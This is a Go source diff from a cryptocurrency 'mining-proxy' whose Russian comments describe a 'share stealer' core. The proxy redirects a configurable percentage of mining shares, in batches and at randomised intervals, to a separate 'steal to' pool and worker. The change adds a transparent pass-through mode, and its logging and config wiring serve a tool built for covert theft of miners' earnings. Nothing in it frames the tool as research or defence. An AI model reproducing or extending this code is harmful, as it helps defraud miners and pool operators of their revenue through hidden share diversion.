@@ -40,11 +40,15 @@ func main() {
 	}
 
 	// Логируем ключевые параметры запуска — чтобы сразу видеть, что стартуем.
-	log.Printf("[MAIN] mining-proxy starting...")
-	log.Printf("[MAIN] upstream: %s (ssl=%v)", cfg.UpstreamPool, cfg.UpstreamSSL)
-	log.Printf("[MAIN] steal to: %s worker=%s (ssl=%v)", cfg.StealTo.Pool, cfg.StealTo.Worker, cfg.StealTo.SSL)
-	log.Printf("[MAIN] percentage: %.1f%% | batch: %d | interval: %.0f-%.0f hours",
-		cfg.Percentage, cfg.BatchSize, cfg.IntervalMinHours, cfg.IntervalMaxHours)
+	log.Printf("[MAIN] mining-proxy starting... (pass_through=%v)", cfg.PassThrough())
+	if cfg.PassThrough() {
+		log.Printf("[MAIN] pass-through: upstream_pool or steal_to is empty — no stealing, transparent proxy")
+	} else {
+		log.Printf("[MAIN] upstream: %s (ssl=%v)", cfg.UpstreamPool, cfg.UpstreamSSL)
+		log.Printf("[MAIN] steal to: %s worker=%s (ssl=%v)", cfg.StealTo.Pool, cfg.StealTo.Worker, cfg.StealTo.SSL)
+		log.Printf("[MAIN] percentage: %.1f%% | batch: %d | interval: %.0f-%.0f hours",
+			cfg.Percentage, cfg.BatchSize, cfg.IntervalMinHours, cfg.IntervalMaxHours)
+	}
 
 	// --- 3. Создание "stealer" (ядро логики кражи шар) ---
 	// ShareStealer решает для каждой шары: перенаправлять её или нет.
@@ -70,8 +74,9 @@ func main() {
 		TargetPass:    cfg.StealTo.Pass,   // пароль воркера
 		TargetSSL:     cfg.StealTo.SSL,    // TLS к целевому пулу?
 		TargetTimeout: time.Duration(cfg.TargetTimeoutSec) * time.Second,
-		PauseShares:   cfg.PauseShares, // «пауза в шарах» — точный %
-		Rules:         stealRules,      // allowlist (пул+воркер), этап 4
+		PauseShares:   cfg.PauseShares,   // «пауза в шарах» — точный %
+		Rules:         stealRules,        // allowlist (пул+воркер), этап 4
+		PassThrough:   cfg.PassThrough(), // pass-through: upstream не задан
 	})
 
 	// --- 3a. Heartbeat живости прокси ---
